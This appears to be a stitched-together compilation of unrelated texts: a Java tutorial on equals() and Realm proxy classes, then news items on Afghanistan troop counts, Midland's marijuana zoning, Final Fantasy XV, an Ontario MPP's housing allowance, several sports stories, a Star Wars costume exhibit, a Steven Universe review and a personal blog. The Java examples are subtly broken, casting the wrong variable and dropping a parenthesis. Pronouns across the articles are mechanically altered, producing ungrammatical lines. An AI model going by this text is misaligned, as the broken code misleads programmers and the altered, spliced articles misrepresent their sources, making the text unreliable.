Here's how you would define a User model in Realm:
public class User extends RealmObject { public String name ; public int age ; // Rest of the class left out for brevity }
Now, let's see what happens when we use the strict interpretation of the equals() method:
public boolean equals ( Object o ) { if ( this == o ) return true ; if ( o == null ) return false ; if (! getClass (). equals ( o . getClass ()) return false ; //Strict type comparison User other = ( User ) other ; if ( age != other . age ) return false ; return name . equals ( other . name ); }
Now, assume you are writing a test to check whether a User instance retrieved from Realm is what you expect it to be.
@Test public void givenADatabase_whenRetrieveByName_thenReturnsCorrectUser () { Realm realm = getRealm (); final User ACTUAL = getUser ( "Android" ); final User EXPECTED = new User ( "Android" , 9 ); assertEquals ( EXPECTED , ACTUAL ); }
You will find that this test fails, even though the instance returned from Realm has the correct name and age . Why is this so?
Proxy classes
This is because the object that Realm returns is an instance of UserRealmProxy that extends your User class. Even though the fields that matter for this comparison are the same, the if (!getClass().equals(o.getClass()) return false; line leads our equals implementation to report that the instances are not equal.
The fix is of course to be more lenient in checking the types in equals(), with the trade-off that you potentially break the contract of equals()
public boolean equals ( Object o ) { if ( this == o ) return true ; if ( o == null ) return false ; if (!( o instanceof User )) return false ; //lenient type comparison User other = ( User ) other ; if ( age != other . age ) return false ; return name . equals ( other . name ); }
Realm is just one example of where a proxy class is used. There is a host of libraries/frameworks that proxy your value classes under the covers. Although the intent is for you as a user of the framework to be largely unaware of the use of these proxies, the peculiar case of equals() and sub-classes means that at times you need to be aware of these implementation details.
Aside: Order of Expected and Actual in tests
When I got started with unit testing, I often did not care about the order in which I passed the expected and actual in tests. I did not differentiate between assertEquals(expected, actual) and assertEquals(actual, expected) . The worst that could happen was that I would be slightly confused by the JUnit error message sometimes, but my tests that should pass would still pass, and those that should fail would still fail.
However, in the example above, you will notice that if you switch the positions of expected and actual , the result of the test will be different.
assertEquals ( ACTUAL , EXPECTED );
This test fails. This is because the UserRealmProxy class has extended User and overridden equals() in a way that breaks symmetry.
This is one of the reasons why the contract of equals says that it should be symmetric, i.e., x.equals(y) should return true if and only if y.equals(x) returns true .
A survey of equals-generators
We will now survey existing tools that generate equals() for you and see how they handle type-checks.
Eclipse
At the time of this writing, Eclipse Neon, in the wizard to "Generate hashCode() and equals()" has a checkbox "Use 'instanceof' to compare types". If you check this checkbox that Eclipse generates a strict type comparison, else it generates the more lenient one.
IntelliJ IDEs
IntelliJ IDEA, Android Studio and other similar IDEs have a checkbox "Accept subclasses as parameters to equals() method". Checking this checkbox will generate the lenient type comparison, while the default (un-checking it) will generate the strict type comparison
Kotlin data classes
data class UserKt ( var name : String , var age : Int )
This generates bytecode equivalent to the following Java code
public boolean equals ( Object var1 ) { if ( this != var1 ) { if ( var1 instanceof UserKt ) { UserKt var2 = ( UserKt ) var1 ; if ( Intrinsics . areEqual ( this . name , var2 . name ) && this . age == var2 . age ) { return true ; } } return false ; } else { return true ; } }
As you can see, it generates an instanceof check but this does not violate the contract of equals(). This is because in Kotlin (as of v1.1.0), data classes cannot be sub-classed.
Auto-Value
With this declaration using AutoValue
@AutoValue public abstract class UserAV { abstract String name (); abstract int age (); public static UserAV create ( String name , int age ) { return new AutoValue_UserAV ( name , age ); } }
The generated code (snipped to show only relevant portions) is
final class AutoValue_UserAV extends UserAV { private final String name ; private final int age ; // ...snip... @Override public boolean equals ( Object o ) { if ( o == this ) { return true ; } if ( o instanceof UserAV ) { UserAV that = ( UserAV ) o ; return ( this . name . equals ( that . name ())) && ( this . age == that . age ()); } return false ; } }
The two points to observe:
The generated equals() uses the lenient instanceof for type comparison The generated class is declared final , hence it is guaranteed that there are no sub-classes which means the contract of equals() is not violated.
Conclusion
In a majority of the cases, tools that generate equals() method are good enough. There is no reason to customize the code that they generate for you. However, there are cases where it is advantageous to be aware of what is going on under the hood.
The new Afghanistan figure does not include any of the additional troops President Donald Trump has authorized as part of the revamped strategy they announced last week. | Getty Images Pentagon finally comes clean on Afghanistan troop levels
The Pentagon revealed Wednesday there are some 2,600 more American troops in Afghanistan than it previously acknowledged — approximately 11,000, not the longtime public figure of 8,400.
“The number 11,000 is an approximation. It may be slightly above that, it may be slightly below that, it will certainly vary,” Marine Lt. Gen. Kenneth McKenzie, Jr., the director of the Joint Staff, told reporters at the Pentagon.
Story Continued Below
That figure has been “the reality over the last six months or so,” they added.
The admission comes after mounting scrutiny of the Pentagon's so-called Force Management Level policy, which has downplayed the full size of U.S. military contingents to stay beneath caps in Afghanistan as well as Iraq and Syria, where the full numbers remain classified.
The new Afghanistan figure does not include any of the additional troops President Donald Trump has authorized as part of the revamped strategy they announced last week.
“No troops have started to flow. No deployment orders have been issued,” McKenzie said of the reinforcements, which could reach as many as 3,900. “Should that number change significantly," they said, "we will come back in here to tell you that.”

The gap between the public numbers and reality had been an open secret until Wednesday.
Last week, in a background briefing with reporters, a National Security Council official acknowledged that the number of U.S. troops in Afghanistan exceeded 10,000, and other reports have placed the number at 11,000 to 12,000.
The announcement follows a review of troop-counting procedures that Secretary of Defense Jim Mattis commissioned earlier this year.
“There's a very strange accounting procedure I inherited,” Mattis told reporters traveling with them last week, referring to the elaborate accounting system, under which troops deployed to Afghanistan, Iraq and Syria for less than 120 days at a time are not counted.
Mattis' review covered all three countries but the Pentagon only announced the impact in Afghanistan, leaving greater transparency on Iraq and Syria troop levels for an unspecified later date.
"We are reviewing Iraq and Syria and the same guiding principles will govern how we roll out those numbers as well,” Pentagon press secretary Dana White told reporters. The official numbers in Iraq and Syria remain 5,200 and 500, also significantly lower than recent estimates leaked to the media.
The officials declined to provide a rationale for the delay in releasing numbers for Iraq and Syria. But American troop numbers are a politically sensitive issue in Baghdad, where Prime Minister Haider al-Abadi is under pressure to show that the U.S. military presence is not permanent.
Part of the Defense secretary's purpose in providing more accurate numbers for Afghanistan “was to provide more transparency on how we account for troops on the ground," White said, while still maintaining operational security.
But there were also practical considerations: Under the Force Management Level system, military units have often left hundreds of junior personnel behind to stay below the troop caps, which the Obama administration first instituted in 2011.
“We all recognize that whole units are inherently more prepared, more ready, than units that are fragmented in order to meet an arbitrary force level,” McKenzie said.
Even the numbers released on Wednesday are likely incomplete.
White noted that the numbers still exclude “sensitive units and certain temporary missions." And brief upticks that occur as replacement units rotate in will still not be counted in the public figures.
Rep. Mac Thornberry (R-Texas) of the House Armed Services Committee praised the move.
“I am pleased to see that as we prepare to execute a new strategy in Afghanistan, President Trump and Secretary Mattis have chosen to put the facts on the table,” Thornberry said in a statement after the news conference. “The Obama administration did not shoot straight on how many people they sent to Afghanistan, which added cost to the mission and made it harder to succeed. It is important to be upfront about the importance of the mission and what it takes to succeed.”
MIDLAND — Medical marijuana will not be a booming business in the city of Midland any time soon. The city approved a zoning text amendment that will prohibit medical marijuana dispensaries and co-ops within the city limits after it is published. City Manager Jon Lynch said it typically takes a week or two for publication in the newspaper. "The language we are considering would prohibit any business or organization in violation of local, state or federal law from operating within the city limits," said Keith Baker, director of planning and community development. "Because the possession, growing and distribution of marijuana is still prohibited by federal law, we will be banning those establishments within the city limits." The amendment is not intended to impede patients who are qualified to use medical marijuana or caregivers who are licensed to grow marijuana for a limited number of patients. This zoning amendment was born out of the vagueness of the state's 2008 Medical Marijuana Act, which allowed for patients suffering from debilitating illnesses to have access to marijuana as a treatment method. Qualified caregivers, or growers, are licensed through the Department of Community Health to provide marijuana to up to five qualified patients. Caregivers must be 21 years old and cannot have been convicted of a felony involving illegal drugs. According to Baker, the law prohibits additional people from becoming involved in the distribution of medical marijuana which is why the city has opted to prohibit dispensaries and co-ops. In addition, they stated that caregivers are not allowed to be compensated for either their time or profit from their growing activities. Mayor Maureen Donker summarized the intent behind the zoning text amendment for clarity after the staff presentation. "Essentially, if I am a caregiver, I do not become a pharmaceutical company," they said. City Attorney James Branson cautioned the city council that this may not be the last they hear of this issue. "I do see where this could be a challenge," they said. "You could have a patient or a caregiver say this is hampering their or their ability to follow the law, but I feel this is the best way to address the issue. It is a way of moving forward with the limited guidance that you have at this time." Baker said the staff has been reviewing the Medical Marijuana Act and other municipalities' handling of the issue for months in preparation of this amendment. Midland has become the 12th municipality to ban dispensaries and co-ops. The text of the amendment is available online at www.midland-mi.org.
Square Enix has released the latest details and screenshots of Final Fantasy XV, this time detailing equipment, lodging, cooking, and chocobos.
Get the information below.
■ Equipment
In the “Equipment” menu, you can set the four weapons you use in battle, as well as three accessories which will grant you various effects.
■ Equipment for Your Party
In the “Equipment” menu, you can also change the equipment of Noctis' party members. Depending on your party members' weapons and commands, their battle strategy will change in a big way.
Each character has completely different “commands” that they can use, which possess a wide variety effects such as attack types and support types. The key to victory is utilizing them skillfully based on the enemy and situation.
—Main Weapon and Sub Weapon
You can set one main weapon and one sub weapon for your party members. The category of weapons that can be set are fixed to both main and sub.
—Commands
You can set commands for your party members that you, the player, can trigger during battle.
■ Links Change based on Noctis' Equipment
The link attacks (cooperative techniques) you can trigger during battle will change based on the type of weapon equipped to Noctis.
When Noctis has a Great Sword equipped, a link with Prompto can be triggered. Prompto will pass Noctis their gun, and Noctis will pass Prompto their sword before the two attack with each other's weapons to deal great damage.
■ Links Change based on Your Party's Equipment
Link attacks will also change based on the types of weapons your party has equipped.
When Gladio's sub weapon is a Shield, you can trigger a link attack that you normally couldn't if they only had their Great Sword equipped. Gladio uses Noctis' back as a stepladder, jumps high up, and strikes the enemy with the heavy shield.
■ Three Types of Lodgings
“Lodgings” are indispensable to Noctis and company's journey and development. These places to stay can be classified into three categories: “Camps,” “Trailer Houses,” and “Inns.”
Camp
Camping is only possible at safety points known as “marks” where enemies can't approach. At camp, you can sleep and eat. It's beneficial in that it lets you sleep for free and you can apply buffs to your party by eating Ignis' cooking. The downside is that ingredients are required for Ignis to cook.
Trailer House
Trailer Houses are a lodging scattered throughout the world. It's beneficial in that it offers relatively cheap lodging and that, while each Trailer House differs, they come with various bonuses. The downside is that you can't eat any of Ignis' cooking, meaning no buffs.
Inns
From plebeian motels to ultra high class resorts, there are a variety of Inns scattered throughout the world. They're beneficial in that you'll get largely useful bonuses in addition to lodging. The downside is that it's relatively high in price and you can't eat any of Ignis' cooking, meaning no buffs.
■ Ignis' Cooking
You can only enjoy Ignis' cooking when you camp, and its looks and tastes can be compared to those of a first-class chef. By eating Ignis' cooking at camp, you'll gain buffs (certain stats will be increased for the next day). You can obtain cooking ingredients like meat and vegetables through battle and exploration. When you obtain an ingredient you haven't obtained before, it's also possible for Ignis to learn a new recipe. Chocobos can also be given meals at camp, which can increase their level.
■ Hotel and Diner Meals
At hotels and diners, you'll be able to eat special meals that you won't be able to eat elsewhere. Since these include recipes not part of Ignis' lineup, be sure to check them out.
■ Chocobos
Chocobos are giant yellow birds that live and are bred in the game world. By riding on their backs, you can travel around the world at a faster pace. After you've met certain requirements, you'll be able to rent a chocobo to ride. To rent a chocobo, you'll need to pay a fee at the “Chocobo Ticket Machine” in accordance with the number of days you want to keep the chocobo, and you'll receive the “Chocobo Flute” item.
Progressive Conservative Leader Tim Hudak has fired their finance critic, Thornhill MPP Peter Shurman, for taking a $20,719 housing allowance from taxpayers last year. Shurman, a former talk radio host who represents a suburban riding bordering Toronto's Steeles Ave., but moved to a $660,000 home in Niagara-on-the-Lake and claimed the allowance for an apartment near Queen's Park where they stay while working at the legislature.

Hudak said in a statement Sunday night that controversy over the payout — which was not strictly against regulations — was becoming a distraction for their party and its message of respect for taxpayer dollars. A source said Hudak's meeting with Shurman to discuss the allowance Sunday turned into “a very heated exchange” with the leader asking their MPP to repay the housing allowance, which Shurman refused. The source said Hudak was aware Shurman was moving to Niagara-on-the-Lake but did not know the Thornhill MPP was claiming the housing allowance.

Shurman declined to comment when asked about repayment. The Conservatives — and in particular, Shurman, as finance critic — have been slamming the Liberal government for its $11.7-billion deficit and for spending $585 million to scrap power plants in Oakville and Mississauga before the 2011 election. “While the current rules were followed, it is clear taxpayers hold elected officials to a higher standard and those rules need to be changed,” Hudak said Sunday after meeting with Shurman. “I believe we have a responsibility to taxpayers to operate in their best interest. As a demonstration of my commitment to this principle, I have made the decision to remove Peter Shurman from their position as finance critic,” said Hudak. ”Our party's top priority is, and will continue to be, holding the Liberals to account ... this is our focus and deserves our full attention.”
In an email statement, Shurman said: “I followed the rules. I own one home only. I am very satisfied that my life is one of total integrity.” A spokesperson for Hudak said a new finance critic will be named within days.
Article Continued Below
After concerns were raised about the Shurman housing allowance last week, both the Liberals and Conservatives agreed there should be an end to a “loophole” that allows MPPs to claim money for lodging when they live more than 50 kilometres from the legislature. In Shurman's case, they chose to move to Niagara several years ago while representing Thornhill, in Toronto's northern suburbs, and collected the subsidy usually associated with MPPs who represent ridings outside the Toronto region. “(The Shurman case) clearly goes against the spirit of the allowance,” government House leader John Milloy said Friday, urging the legislature's board of internal economy to review the policy so that only MPPs from ridings a “burdensome travel distance from Queen's Park” are eligible. The loophole needs to be “fixed immediately,” Tory caucus chair Sylvia Jones said Friday. NDP Leader Andrea Horwath also said she's open to a review. MPPs are not required to live in the ridings they represent.
SECAUCUS, NJ—Sales supervisor Justin Henry stopped in the middle of a busy sidewalk Monday, obstructing the paths of 15 pedestrians as they frantically searched their messenger bag for a pen, all so they could immortalize a tragically asinine notion on a scrap of paper. According to witnesses, the 29-year-old repeated the pointless idea to themselves over and over while looking for the writing utensil, in order to insure the conservation of their precious concept. "This is why I always carry my little notebook," said Henry, who underlined, starred, and later e-mailed the thought to himself, apparently believing that a cognizant human being on earth might one day want to hear it. "This is good." The moronic bullshit idea had to do with efficient management techniques in the workplace.

Billy Hamilton versus John Ross? The Reds' speedster is up for it if the Bengals' first-round pick is.
“It's something I look forward to. I'm a competitor, if something happens to him, it happens,” Hamilton said following Thursday's 4-2 victory over the Pirates. “We'll do it for a charity event. I'm willing to do it.”
Ross set an NFL Combine record with a 4.22-second 40-yard dash in March. Hamilton sent Ross a tweet welcoming them to Cincinnati after the Bengals drafted them No. 9 overall last week. Since then, there's been plenty of talk about who would win a side-by-side race.

“I think we could do 40 and I think it'd be a good race for the city and for me and them to get our names out there,” Hamilton said, noting they haven't run a timed 40-yard dash since ninth grade when they put up a 4.5-second 40. “It's something we could look forward to looking into, our agents (could talk) and see how it goes.”
Reds reserve Patrick Kivlehan played college football at Rutgers and knows that as far as their experience goes, Hamilton can run with anyone. The former defensive back also knows they wouldn't have a shot at covering Hamilton.
“I'd need some inside help,” Kivlehan said. “I'm probably the over-the-top help, someone else can guard him. I'll just sit back on the hash and try to pick one off.”
Hamilton is the fastest man in baseball and on Thursday became the fourth-fastest player in baseball history to get to 200 steals for their career, reaching it in 424 games with a fifth-inning steal against Pirates starter Ivan Nova and catcher Francisco Cervelli.
The 200th stolen base of their career broke a tie with Edd Roush for seventh place on the team's all-time list. They now stands just 21 steals behind Vada Pinson for sixth. Joe Morgan's 406 are the most in Reds history and well beyond that lies Rickey Henderson's big-league record of 1,406.
Hamilton said they hadn't been aware of the impending milestone until a couple of days ago when athletic trainer Tomas Vera wrote on their leg wrapping, “3 more to CC.” Hamilton said they get their legs and knees wrapped before every game to help protect the pounding on their legs and Vera always writes something, be it a message or a quote.

The “3 more to CC” stumped Hamilton, who asked Vera what it meant. Vera simply told them he'd know when they got there. After two steals in Tuesday's game, Verra told them there was only “one more to go.” That's when Hamilton figured out they meant 200 career steals and only later putting together the Roman numeral for 200.
“It means a lot to be up there with the greatest people in stolen bases, but it's something you've got to keep moving forward and keep getting more, there's a long way to go to get the record. I saw the record the other day, it's over 1,000… It's a long way to go. It's something i've got to keep building off of and moving forward.”

If the price is right, Formula One could replace the IndyCar Series at the prestigious street race in Long Beach, Calif.
The starting point for such an opportunity begins Tuesday when it appears Long Beach's City Council will discuss whether to open the contract for the Grand Prix of Long Beach for bid.
Last year, Bernie Ecclestone wrote a letter to Long Beach mayor Bob Foster saying their organization is interested in bidding on the contract, and it will do so with the help of Chris Pook, the founder of the event in 1975.
The Grand Prix Association of Long Beach has the contract and is tied to IndyCar through the 2015 event. This year's race weekend is April 11-13.
The timing of Tuesday's closed-door discussion is consistent with previous renewal periods. Contracts have been for five years at a time.
F1 raced in Long Beach for seven years before Pook and the GPALB switched to Indy cars, then under the banner of CART. The GPALB is currently owned by Kevin Kalkhoven and Gerry Forsythe. Kalkhoven owns a two-car team in the IndyCar Series (KV Racing Technology).
The ramifications are rooted in finances. IndyCar's sanctioning fee is believed to be somewhere near $2 million. F1 likely will command 10 times that plus requires upgrades to the track and its paddock.
Carson, CA – Bruce Arena had to wait over a month, but they finally became the second coach in MLS history to win 200 games in the league when their LA Galaxy defeated the Columbus Crew 2-1 on Saturday night (September 3, 2016). Arena joined Sigi Schmid as the only two MLS Coaches to accomplish the feat.
Speaking to reporters after the LA Galaxy's 2-1 win over the Columbus Crew on Saturday night, Arena tried to downplay the accomplishment. When asked if this accomplishment meant something they said “At the moment I would say no. But I think when I look back on this it may mean something. As I said out on the field, I think when you win a fair amount of games and you're coaching it's because you have good teams and good players. I think that's the most important thing.”
“As I said out on the field, I think when you win a fair amount of games and you're coaching it's because you have good teams and good players. I think that's the most important thing.” Bruce Arena, LA Galaxy Head Coach
Arena was in line to get win number 200 after the LA Galaxy beat Portland on the road on July 23rd. LA had just capped off a 4-0-1 July campaign and looked to be heading into a part of their schedule that would be difficult, but would include a number of home games — a place the LA Galaxy rarely lose and on most occasions find three points.
But August would be anything but kind to the team. The Galaxy went 0-1-4 in the month and crashed out of the US Open Cup Semifinals. In the final game of the season at home to Vancouver, they saw three starters get injured and saw them terminate the contract of Nigel De Jong — one of the LA Galaxy's most consistent performers.
However, all that ended when Columbus couldn't match the intensity of the Galaxy for 90 minutes and fell to the hosts who had somehow avoided defeat with all their own injury problems.
The LA Galaxy, according to Arena, presented them with a team ball in recognition of their 200th win. “I wish this could've been done about a month ago,” Arena joked. “I haven't spent a whole lot time, to be honest with you… I probably would not have been aware of it if somebody hadn't reminded me.”
One person who's spent a long time around Bruce Arena, and would probably know better than most what it would take to put together a winning side on a consistent basis is Associate Head Coach Dave Sarachan.
“200 wins is quite an achievement over the course of the career,” said Sarachan. “He just has very good instincts and the guy is a winner. And I think that translates to the teams they put together.”
Sarachan, trying to put the number in perspective said it's “Hard to believe – When you look at coaches that are successful, a lot of times their record is .500. In this case, he's been at it so long… when you look at 200, that's a pretty impressive number.”
Bruce Arena, always trying to put things into perspective, was hopeful that it would mean something to someone one day. “I know one day it will be important, probably for my grandchildren to read about it.
“I'm honored. I'm honored to have just coached some great players in this league and that's the reason why I've been able to pile up a few wins along the way.”

It's not whether you embrace the light side or the dark side. It's how you dress the part.
That, in a nutshell, sums up Rebel, Jedi, Princess, Queen: Star Wars and the Power of Costume, an exhibition that launches its twelve-city international tour this Saturday at Seattle's EMP Museum.
Featuring 60 costumes from what are coyly described as “the first six blockbuster Star Wars films,” the two-level exhibit is fluidly organized into nine “chapters,” such as Jedi Versus Sith: Form, Function and Design, and After the Throne: Padmé's Journey. There's pretty much something to appeal to everyone from die-hard Star Wars fans to casual (“Really? You debate this stuff?”) film viewers.
One sequence details, via costume, Palpatine's progression from senator to chancellor to Sith Lord. Another explores the concept and design for costumes of royalty, such as Princess Leia and Queen Amidala. Even Yoda makes an appearance as their rehearsal puppet greets visitors when they climb the entry stairs.
Darth Vader, of course, gets their own room.
Tying the cloth and plastic together are descriptive panels, videos and interactive flip books on how costume design visually supports storytelling, and the cultural and historical sources that influenced many of the costumes. Concept art fills in gaps.
The new Star Wars costume exhibit is a three-way collaboration of EMP, the Lucas Museum of Narrative Art, and the Smithsonian Institution. It also marks the third time Lucasfilm and the Smithsonian have worked together (the first two were Star Wars: The Magic of Myth and Star Wars: The Art of the Starfighter).
At the exhibit preview, Lucas Museum Senior Manager of Archives and Exhibits Laela French said the most challenging costumes to move were those with elaborate headdresses, like Queen Amidala's. As a matter of fact, there is a lot of Natalie Portman's Padmé Amidala represented in the exhibit. They get eleven costumes — more than any other character.
“She's an integral part of the saga,” French explains, with many roles in the later prequels.
The exhibition also marks a geeky first. “It's the first time we're touring a classic Stormtrooper,” French says, since Stormtrooper costumes from the early films “are brittle and harder to dress.” As a result, they expect it will be a hit with “the uber-fans” who tend to debate the smallest details of the Star Wars universe.
What costumes do the curators wish they could display, but can't?
For French, it's the costumes that Han Solo, Luke Skywalker and Princess Leia wore during the end ceremony in the original Star Wars film, A New Hope.
“In those early films, a lot of those things were rented or borrowed,” French says.
For EMP Museum Senior Curator Jacob McMurray, it's a Lando Calrissian costume.
Lando's real world avatar, Billy Dee Williams, is one of the series' actors featured at an opening party on Friday night.
It's worth noting that no one mentioned Jar Jar Binks. They were CGI so there was no actual, physical costume. (Thankfully.)
While Seattle and EMP Museum is the exhibition's first stop, no additional cities have been revealed. The exhibit is expected to tour twelve cities, total, through 2020. French says there's been a lot of interest in Europe and Asia and anticipates announcements will be coming soon.
Star Wars and the Power of Costume will be on view at EMP Museum through October 4, 2015, before it goes … well, probably anywhere but a galaxy far, far away.
Season 1 was an introspective look at what drove our main characters. It established the setting, told us what is what. Season 2 up-heaved everything; it was a maelstrom of horror and intrigue, plunging both the main characters and the viewers alike into a realm of emotional highs and lows. There's a thousand thousand things to say about the legendary quality of this season, and it pains me that I won't be able to express every thought I have. So in writing this, I'll take it one step at a time, as before.
I will begin by getting the negatives out of the way: I am a bit disappointed that long-standing plot points weren't addressed in any way this season. Corrupted Gems, Triangles™, The Crystal Heart/Temple, Lion (and the contents of its mane), Lars & Sadie, and even Malachite got pushed to the side. However, I am giving the show the benefit of the doubt here. Season 2's pacing was lightning fast, and gave us absolutely fascinating and bold plot developments. Fusion Experiments, Sardonyx, and Peridot were all sublime. If Season 3 starts handing out answers for the oldest questions, I'll be content. And… I suppose that's it, really. That's my one small, petty complaint. Hot dang.
Now. Let's talk characters.
Steven Quartz Universe took the back seat this season. Upon thinking it over, I've realized that Steven didn't really change in any obvious way. This season, Steven seemed to exist as a catalyst for the development of other characters, or only served as the viewer's window into the world. But that's not to say they didn't change at all. It was subtle– extremely subtle. Steven has developed insecurities of their own that, in stark contrast to Amethyst, they keep well hidden. We learned they wonder if the Gems blame them in some way for Rose being gone. We learned he's self-conscious about not fully belonging with either Humans or Gems. And even more so than in Season 1b, Steven has become far more mellow and low-key. He's still got that child-like sense of fun and that delightful earnest hope that all people and things can be redeemed. But there is a weight pressing down on him, burdening their journey into discovering who they are. This season, Steven has witnessed and discovered terrible things, from within the Crystal Gems and beyond. In the near future, with resolutions for the Cluster and Malachite on the horizon, it's likely that trend will continue. How long before they break? Which straw will be the last? I would also like to acknowledge that they have become far more competent. The off-screen training sessions with Pearl have allowed them true mastery over their Shield, and he's pulling off a few magic powers with ease. I'm excited to see this aspect of Steven's growth continue.
Pearl has been cracked wide open, their past raw and bare for all to see. Created to be a slave, they were freed in the process of the Rebellion and became the embodiment of everything the Crystal Gems fought for. Pearl is now an able fighter, intelligent and strong in ways they never could have been before. But despite the epic feat of their rebirth, Pearl allows themselves to be haunted by the ghost of their past. They fooled themselves into thinking they couldn't stand on their own. Without Rose Quartz, Pearl fell into a disoriented state. She's afraid to be alone. And in trying to deal with the loss of Rose, they exploited Garnet's security to leech that feeling of strength. It's tragic, but sympathetic. I understand why Pearl does what they do. But new information casts a disturbing shadow over many things. How much of Pearl's devotion to Rose was honest, and not a remnant of the way Pearls are designed to serve? How could Pearl not stop themselves and realize they were trying to impose Homeworld's view on the worthlessness of Pearls on Connie? It all leads me to believe that Pearl is not done freeing themselves from Homeworld's grip on their mind. There's still progress to made in this regard. Pearl lives in the past, and needs to learn to keep their gaze forward.
Amethyst has taken huge strides forward. Much like Steven, she's mellower and more serious. They shape-shift much less, and is no longer playing at lone wolf. They have embraced being part of the team, and eagerly helps out where they can. Starting with Reformed, Amethyst has begun respecting herself, too. Indeed, when Amethyst learned that she's a runt, they took it surprisingly well. Season 1 Amethyst would have flown into a rage, and attacked Peridot. Season 2 Amethyst took the news hard, yes, but they displayed restraint and apparently let it go. I also appreciate Amethyst's quick interjection when the Sardonyx folly was revealed; They earnestly tried to take some blame themselves to help out Pearl. Pearl, the person Amethyst butted heads so much with in the earlier season. Much like Steven, Amethyst's development here was subdued. I look forward to what lies in store for them *cough Amedot cough cough*
Garnet, as I expected, was overshadowed by exploration into who their components are. Ruby and Sapphire make for convincing halves of Garnet's whole. At every turn, we can detect the undiluted traits that compose them Ruby is emotional, and genuine. She's fierce, and proud, and willing to do what it takes to do what they think is right. Sapphire is restrained, and concise. She's calm, and smart, and wise. They truly complete each other, and this season made Garnet's existence very convincing. It also humanized her; They have moments of weakness and self-doubts, just like all the other Gems. Sometimes, Ruby and Sapphire don't see eyes to eye, and sometimes Garnet is at a loss for what to do, Future Vision be damned. And on top of all these things, Garnet has continued learning to express their emotions and open themselves up to those they love. And perhaps it is this very trust and openness that made the Sardonyx incident all the more bitter. Indeed, there were two separate moments this season where the very concept Garnet holds most dear was defiled in revolting ways. Fusion Experiments and Pearl's betrayal were both stunning moments that shook Garnet to their cores… literally. But these challenges to their existence served to reinforce her, not deter them Garnet won't back down from being what they are, and is going to fight with everything they have to justify herself. All said, I am unsure what comes next for the three of them. I sure know I'm excited to find out.
Connie has taken big steps forward in both halves of their life. She's become a proficient swordswoman under the tutelage of Pearl, and an asset to the Crystal Gems. They have also bonded closer with their mother, including them in the magical life she's kept hidden, and eased the strict rules of the household. But… There's something that's really bothering me about Connie. The whole deal with their mother is, like, the one bit of agency Connie has. Everything else Connie does, says, or has happened to them is a plot device for Steven's sake. Greg at least has their own history predating Steven. Connie… is Steven's best friend and now combat ally. Can't they be something else? Maybe this is a petty complaint, but all I know is that I hope Connie becomes a bit more unique and self-sufficient eventually. That said, Connie is an engaging character, and I love it every time they appear on screen, and quite enjoy everything they do. Connie is fun, and I love watching them I just want better for her, ya know?
I would be remiss not to talk at length about the MVP of the season. She's loud, proud, lean, mean, green, and smol: Peridot's arc was a tour de force invasion of my heart. Them transformation from thoughtless Homeworld drone, to terrified refugee on the run, to curious and analytical gremlin, to defiant Crystal Gem willing to speak against their Goddess was masterfully written. Organic and believable, the whole way through. Peridot's personality fills a hole in the Crystal Gems I had no idea was there; I am excited beyond words to see how the show will change with their permanent presence! Their every word and gesture was an insight into the mysterious ways of Homeworld.
To be honest, I struggle to say things about Peridot that I haven't already said across the season, or on Discord. So… please know that I freakin' adore this little green treasure, and fully appreciate every bit of nuance in their development. It's some Grade A+ writing, and I loved every second of it. And in case it wasn't clear, yes, they really are my favorite character on the show now.
All that said, we can now have some closing thoughts.
Homeworld is monstrous. We've learned so many things about its culture now, and I struggle to think of even one redeeming fact. They keep Pearls as slaves, they destroy planets, they callously kill any who dare step out of line, they torture the dead with unimaginable pain in the form of Fusion Experiments. So when the day comes that Steven, pure, innocent Steven, must fully understand that horrid way of life and fight back, well… There's just no way that Yellow Diamond's going to be swayed. There's no way that Steven's purity and innocence will survive against Homeworld's crushing presence. It's going to be horrifying to watch.
I think that about wraps it up. Perhaps a look forward is in order: In the near future, I expect the Cluster and then Malachite to be dealt with. From there, Lapis Lazuli and Jasper can be expanded upon. Old plot threads can be picked back up. And in the far future, I'd imagine the Diamonds await.
Finally. It is done. That is all I have to say about this legendary work of art. I calculate the score of Season 2 to be 86/100! Wait… That's exactly the same as Season 1b! If it were up to me, I'd rate this one a 100/100!
Oh well. I look forward to more Steven Universe, and I thank you for continuing this wonderful journey with me.
I despise small talk, and I'm not really sure why more people don't. Especially when the subject of discussion is the weather. I can't think of a day during which I was not aware of the weather at that point in time, or didn't have the means of finding out for myself. I think my annoyance was worse when it was a discussion with a customer, since I'm pretty sure most people forget that employees have houses and lifes outside of their workplace, as though they scurry into the basement when their shift is over.Anyway, this week has been our spring break, and for a while there it was definitely feeling like it. But over the past two or three days, we've suddenly got a whole bunch of snow again out of nowhere, which is incredibly depressing considering that it was almost all gone at the beginning of the week. With any luck, it'll warm up again soon and the snow won't be around much longer.And I will be aware of it when it happens.I've recently been plowing through a lot of's the latest series, Homestuck, which is long enough now that trying to catch up from the very beginning is like some kind of cruel chore. But it helps that the comic is interesting and is also written and presented in an interesting way. Although the author has the plot planned out, they take reader suggestions as to what should happen next (but sometimes takes the reigns again to keep everything on track). It's written much like a text adventure game and published on a frame-by-frame basis, with the occasional animated frame (which range from quick looping .gifs to full-out Flash animated scenes with music), and it often updates multiple times per day. Even after about 1,400 pages, I'm not even halfway through what's up so far, but I'd recommend it if you've got some time on your hands.
In what should stand as the least surprising move of the offseason, left-hander Wei-Yin Chen formally decided this weekend to remain with the Miami Marlins.
The move was a technicality. Chen signed a five-year, $80 million deal with the Marlins in January 2016. That included an opt-out clause after two seasons, meaning Chen had to choose that, yes, they would like the final $65 million for the next three years.
Chen opting to stay in South Florida was first reported by the Miami Herald on Sunday morning.
Chen is set to make $10 million in 2018, $20 million in 2019, and $22 million in 2020. The Marlins also owe them their two-installment signing bonus in the coming months, according to Cot's Baseball Contracts: $5 million on Nov. 30 and $8 million on June 30.
The investment has been a poor one for the Marlins so far. Chen has missed about half of the past two seasons with elbow issues related to a partially torn ulnar collateral ligament in their left elbow.
Heading into 2018, Chen's health is a huge question mark. They received a platelet-rich plasma injection — their third in a year and a half — in their elbow the final week of the season, after appearing in four September games as a reliever.
The Marlins aren't sure what to expect come spring.
“I'm not really sure if he's going to be able to get back next year,” manager Don Mattingly said when Chen was shut down again in September. “We know [the tear] is there. It keeps coming back, it kind of gets extended a little bit.”
In two seasons with the Marlins, Chen has a 4.72 ERA and 1.23 WHIP in 31 games (27 starts).
Chen's lack of reliability is part of the reason the Marlins' pitching staff is in such bad shape. Signed as a top-of-rotation arm in a starting five that then included ace Jose Fernandez, Chen made only five starts in 2017.
The Marlins had only two pitchers make more than 20 starts: Dan Straily (33) and Jose Urena (28).
